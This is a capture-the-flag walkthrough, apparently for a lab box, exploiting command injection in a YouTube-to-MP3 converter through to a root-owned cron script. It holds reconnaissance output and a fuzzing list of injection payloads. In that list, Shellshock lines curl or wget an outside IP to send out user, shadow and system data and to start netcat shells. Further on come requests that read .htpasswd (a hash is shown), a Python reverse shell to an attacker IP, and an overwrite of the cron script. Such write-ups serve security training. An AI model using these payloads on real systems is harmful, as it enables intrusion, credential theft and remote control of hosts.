## nmap
```
root@kali:~# nmap -sV -p- $target
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 11:15 UTC
Nmap scan report for ip-10-10-198-74.eu-west-1.compute.internal (10.10.198.74)
Host is up (0.00080s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:25:D4:29:B9:78 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.58 seconds
root@kali:~# nmap -sV -A -p- $target
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 11:15 UTC
Nmap scan report for ip-10-10-198-74.eu-west-1.compute.internal (10.10.198.74)
Host is up (0.0012s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 02:25:D4:29:B9:78 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/11%OT=22%CT=1%CU=41739%PV=Y%DS=1%DC=D%G=Y%M=0225D4%T
OS:M=5EB93402%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=104%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.24 ms ip-10-10-198-74.eu-west-1.compute.internal (10.10.198.74)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.79 seconds
```


## gobuster
```
root@kali:~# gobuster dir -u http://10.10.198.74 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.198.74
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/11 11:24:25 Starting gobuster
===============================================================
/images (Status: 301)
/admin (Status: 401)
/js (Status: 301)
/tmp (Status: 301)
/server-status (Status: 403)
```


## http
```
POST / HTTP/1.1
Host: 10.10.198.74
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: */*
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 54
Origin: http://10.10.198.74
Connection: close
Referer: http://10.10.198.74/

yt_url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D111
```
```
{
  "status": 1,
  "errors": "WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: Incomplete YouTube ID 111. URL https://www.youtube.com/watch?v=111 looks truncated.\n",
  "url_orginal": "https://www.youtube.com/watch?v=111",
  "output": "",
  "result_url": "/tmp/downloads/5eb935278e2d1.mp3"
}
```


```
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
/index.html|id|
;id;
;id
;netstat -a;
;system('cat%20/etc/passwd')
;id;
|id
|/usr/bin/id
|id|
|/usr/bin/id|
||/usr/bin/id|
|id;
||/usr/bin/id;
;id|
;|/usr/bin/id|
\n/bin/ls -al\n
\n/usr/bin/id\n
\nid\n
\n/usr/bin/id;
\nid;
\n/usr/bin/id|
\nid|
;/usr/bin/id\n
;id\n
|usr/bin/id\n
|nid\n
`id`
`/usr/bin/id`
a);id
a;id
a);id;
a;id;
a);id|
a;id|
a)|id
a|id
a)|id;
a|id
|/bin/ls -al
a);/usr/bin/id
a;/usr/bin/id
a);/usr/bin/id;
a;/usr/bin/id;
a);/usr/bin/id|
a;/usr/bin/id|
a)|/usr/bin/id
a|/usr/bin/id
a)|/usr/bin/id;
a|/usr/bin/id
;system('cat%20/etc/passwd')
;system('id')
;system('/usr/bin/id')
%0Acat%20/etc/passwd
%0A/usr/bin/id
%0Aid
%0A/usr/bin/id%0A
%0Aid%0A
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
%0a ping -i 30 127.0.0.1 %0a
`ping 127.0.0.1`
| id
& id
; id
%0a id %0a
`id`
$;/usr/bin/id
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=5"
() { :;}; /bin/bash -c "sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6"
() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
() { :;}; /bin/bash -c "sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7"
() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8"
() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"
() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
cat /etc/hosts
$(`cat /etc/passwd`)
cat /etc/passwd
%0Acat%20/etc/passwd
{{ get_user_file("/etc/passwd") }}
<!--#exec cmd="/bin/cat /etc/passwd"-->
<!--#exec cmd="/bin/cat /etc/shadow"-->
<!--#exec cmd="/usr/bin/id;-->
system('cat /etc/passwd');
<?php system("cat /etc/passwd");?>
```

```
POST / HTTP/1.1
Host: 10.10.245.6
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: */*
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 11
Origin: http://10.10.245.6
Connection: close
Referer: http://10.10.245.6/

yt_url=;ls;
```

```
HTTP/1.1 200 OK
Date: Mon, 11 May 2020 12:19:25 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 561
Connection: close
Content-Type: text/html; charset=UTF-8

{"status":2,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nls: cannot access '18': No such file or directory\nls: cannot access '\/var\/www\/html\/tmp\/downloads\/5eb942cda01ca.%(ext)s': No such file or directory\n","url_orginal":";ls","output":"","result_url":"\/tmp\/downloads\/5eb942cda01ca.mp3"}
```

```
POST / HTTP/1.1
Host: 10.10.245.6
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: */*
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 21
Origin: http://10.10.245.6
Connection: close
Referer: http://10.10.245.6/

yt_url=;htacess|find;
```
```
HTTP/1.1 200 OK
Date: Mon, 11 May 2020 12:30:59 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 743
Connection: close
Content-Type: text/html; charset=UTF-8

{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: htacess: not found\nsh: 1: -f: not found\n","url_orginal":";htacess|find;","output":".\n.\/js\n.\/js\/jquery-3.5.0.min.js\n.\/js\/main.js\n.\/index.php\n.\/admin\n.\/admin\/.htpasswd\n.\/admin\/index.php\n.\/admin\/.htaccess\n.\/admin\/flag.txt\n.\/.htaccess\n.\/images\n.\/images\/youtube.png\n.\/images\/mp3-file.png\n.\/tmp\n.\/tmp\/clean.sh\n.\/style.css\n","result_url":"\/tmp\/downloads\/5eb945831a3b5.mp3"}
```



```
POST / HTTP/1.1
Host: 10.10.245.6
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: */*
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 32
Origin: http://10.10.245.6
Connection: close
Referer: http://10.10.245.6/

yt_url=;cat	.\/admin\/.htaccess;
```
```
HTTP/1.1 200 OK
Date: Mon, 11 May 2020 12:58:33 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 566
Connection: close
Content-Type: text/html; charset=UTF-8

{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";cat\t.\\\/admin\\\/.htaccess;","output":"AuthName \"AdminArea\"\nAuthType Basic\nAuthUserFile \/var\/www\/html\/admin\/.htpasswd\nRequire valid-user\n","result_url":"\/tmp\/downloads\/5eb94bf9dd718.mp3"}
```

```
POST / HTTP/1.1
Host: 10.10.245.6
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: */*
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 47
Origin: http://10.10.245.6
Connection: close
Referer: http://10.10.245.6/

yt_url=;cat	\/var\/www\/html\/admin\/.htpasswd;
```
```
HTTP/1.1 200 OK
Date: Mon, 11 May 2020 13:00:23 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 529
Connection: close
Content-Type: text/html; charset=UTF-8

{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";cat\t\\\/var\\\/www\\\/html\\\/admin\\\/.htpasswd;","output":"itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y\/\n","result_url":"\/tmp\/downloads\/5eb94c678817a.mp3"}
```

# flag
```
POST / HTTP/1.1
Host: 10.10.245.6
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: */*
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 31
Origin: http://10.10.245.6
Connection: close
Referer: http://10.10.245.6/

yt_url=;cat	.\/admin\/flag.txt;
```

# exploit
```
POST / HTTP/1.1
Host: 10.10.245.6
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: */*
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 236
Origin: http://10.10.245.6
Connection: close
Referer: http://10.10.245.6/

yt_url=;python	-c	'import	socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.223.163",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';
```


## check
```
https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64

./pspy64

2020/05/11 13:56:53 CMD: UID=33   PID=1841   | /usr/sbin/apache2 -k start
2020/05/11 13:56:53 CMD: UID=0    PID=18     |
2020/05/11 13:56:53 CMD: UID=33   PID=1774   | /usr/sbin/apache2 -k start
2020/05/11 13:56:53 CMD: UID=0    PID=170    |
2020/05/11 13:56:53 CMD: UID=0    PID=17     |
2020/05/11 13:56:53 CMD: UID=0    PID=16     |
2020/05/11 13:56:53 CMD: UID=0    PID=15     |
2020/05/11 13:56:53 CMD: UID=0    PID=14     |
2020/05/11 13:56:53 CMD: UID=0    PID=13     |
2020/05/11 13:56:53 CMD: UID=33   PID=1284   | /usr/sbin/apache2 -k start
2020/05/11 13:56:53 CMD: UID=33   PID=1283   | /usr/sbin/apache2 -k start
2020/05/11 13:56:53 CMD: UID=33   PID=1278   | /usr/sbin/apache2 -k start
2020/05/11 13:56:53 CMD: UID=33   PID=1253   | /usr/sbin/apache2 -k start
2020/05/11 13:56:53 CMD: UID=0    PID=12     |
2020/05/11 13:56:53 CMD: UID=0    PID=117    |
2020/05/11 13:56:53 CMD: UID=0    PID=11     |
2020/05/11 13:56:53 CMD: UID=0    PID=100    |
2020/05/11 13:56:53 CMD: UID=0    PID=10     |
2020/05/11 13:56:53 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity
2020/05/11 13:57:01 CMD: UID=0    PID=4332   | bash /var/www/html/tmp/clean.sh
2020/05/11 13:57:01 CMD: UID=0    PID=4331   | bash /var/www/html/tmp/clean.sh
2020/05/11 13:57:01 CMD: UID=0    PID=4330   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh
2020/05/11 13:57:01 CMD: UID=0    PID=4329   | /usr/sbin/CRON -f
```

## get root flag
```
echo '/root/root.txt >rootflag.txt'>/var/www/html/tmp/clean.sh
```
